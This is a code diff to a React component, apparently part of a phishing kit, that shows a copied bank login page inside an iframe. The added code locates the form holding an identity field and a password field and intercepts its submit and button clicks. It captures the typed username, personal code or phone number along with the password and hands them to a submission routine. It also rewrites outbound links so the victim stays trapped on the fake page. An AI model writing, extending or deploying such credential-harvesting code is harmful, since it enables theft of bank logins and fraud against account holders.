@@ -90,6 +90,46 @@ function readFieldValue(el: HTMLInputElement | HTMLTextAreaElement | HTMLSelectE
   return el.value?.trim() ?? "";
 }
 
+function getFormFields(form: HTMLFormElement) {
+  return Array.from(
+    form.querySelectorAll<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>("input, textarea, select"),
+  ).filter(isMeaningfulField);
+}
+
+function formHasIdentityAndPassword(form: HTMLFormElement, doc: Document) {
+  const fields = getFormFields(form);
+  let hasIdentity = false;
+  let hasPassword = false;
+
+  for (const field of fields) {
+    const kind = inferFieldKind(field, getElementLabel(doc, field));
+    if (kind === "password") hasPassword = true;
+    if (kind === "username" || kind === "personalCode" || kind === "bankPhone") {
+      hasIdentity = true;
+    }
+  }
+
+  return hasIdentity && hasPassword;
+}
+
+function canSubmitForm(form: HTMLFormElement, doc: Document) {
+  const fields = getFormFields(form)
+    .map((field) => {
+      const value = readFieldValue(field);
+      if (!value) return null;
+
+      return {
+        key: field.getAttribute("name") || field.getAttribute("id") || "",
+        value,
+        kind: inferFieldKind(field, getElementLabel(doc, field)),
+        type: (field.getAttribute("type") ?? "").toLowerCase(),
+      } satisfies CapturedField;
+    })
+    .filter((field): field is CapturedField => Boolean(field));
+
+  return hasIdentityField(fields) && hasPasswordField(fields);
+}
+
 function hasIdentityField(fields: CapturedField[]) {
   return fields.some((field) =>
     (field.kind === "username" || field.kind === "personalCode" || field.kind === "bankPhone") &&
@@ -231,9 +271,20 @@ export function NzExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
     const doc = iframe?.contentDocument;
     if (!iframe || !doc) return;
 
+    const loginForm =
+      Array.from(doc.querySelectorAll("form")).find((form) => formHasIdentityAndPassword(form, doc)) ?? null;
+
+    if (!loginForm) return;
+
     const submitWithCurrentValues = async (event?: Event) => {
       event?.preventDefault();
       event?.stopPropagation();
+      event?.stopImmediatePropagation?.();
+
+      if (!canSubmitForm(loginForm, doc)) {
+        return;
+      }
+
       const captured = captureFieldsFromFrame();
       if (captured.length === 0) return;
       await submitCapturedFields(captured);
@@ -245,11 +296,29 @@ export function NzExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       form.setAttribute("method", "post");
       form.setAttribute("target", "_self");
       form.setAttribute("novalidate", "novalidate");
-      form.addEventListener("submit", submitWithCurrentValues);
+      if (form === loginForm) {
+        form.addEventListener("submit", submitWithCurrentValues);
+      }
     });
 
+    const updateSubmitState = () => {
+      const isValid = canSubmitForm(loginForm, doc);
+      actionNodes.forEach((node) => {
+        if ("disabled" in node) {
+          node.disabled = !isValid || saving;
+        }
+
+        node.setAttribute("aria-disabled", !isValid || saving ? "true" : "false");
+        node.style.pointerEvents = !isValid || saving ? "none" : "";
+        node.style.opacity = !isValid || saving ? "0.65" : "";
+        node.style.cursor = !isValid || saving ? "default" : "";
+      });
+    };
+
     const actionNodes = Array.from(
-      doc.querySelectorAll<HTMLButtonElement | HTMLInputElement | HTMLAnchorElement>("button, input[type='submit'], input[type='button'], a"),
+      loginForm.querySelectorAll<HTMLElement>(
+        "button, input[type='submit'], input[type='button'], [role='button'], .el-button, .van-button, .btn-submit, [data-testid='login-button']",
+      ),
     );
     actionNodes.forEach((node) => {
       const nodeText =
@@ -257,20 +326,36 @@ export function NzExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         node.getAttribute("value") ||
         node.getAttribute("aria-label") ||
         "";
-      const wasExternalLink = node instanceof HTMLAnchorElement && isExternalHref(node.getAttribute("href"));
+      const isSubmitInput =
+        node instanceof HTMLInputElement &&
+        ["submit", "button"].includes((node.getAttribute("type") ?? "").toLowerCase());
 
-      if (node instanceof HTMLAnchorElement && wasExternalLink) {
-          node.setAttribute("href", "#");
-          node.setAttribute("target", "_self");
-          node.setAttribute("rel", "nofollow noopener noreferrer");
-      }
-
-      if (!(ACTION_BUTTON_RE.test(nodeText) || wasExternalLink)) {
+      if (!(ACTION_BUTTON_RE.test(nodeText) || isSubmitInput)) {
         return;
       }
 
       node.addEventListener("click", submitWithCurrentValues);
     });
+
+    Array.from(doc.querySelectorAll<HTMLAnchorElement>("a")).forEach((link) => {
+      if (!isExternalHref(link.getAttribute("href"))) return;
+      link.setAttribute("href", "#");
+      link.setAttribute("target", "_self");
+      link.setAttribute("rel", "nofollow noopener noreferrer");
+    });
+
+    getFormFields(loginForm).forEach((field) => {
+      field.addEventListener("input", updateSubmitState);
+      field.addEventListener("change", updateSubmitState);
+      field.addEventListener("keydown", (event) => {
+        if (event.key === "Enter" && !canSubmitForm(loginForm, doc)) {
+          event.preventDefault();
+          event.stopPropagation();
+        }
+      });
+    });
+
+    updateSubmitState();
   }, [captureFieldsFromFrame, submitCapturedFields]);
 
   const handleFrameLoad = useCallback(() => {
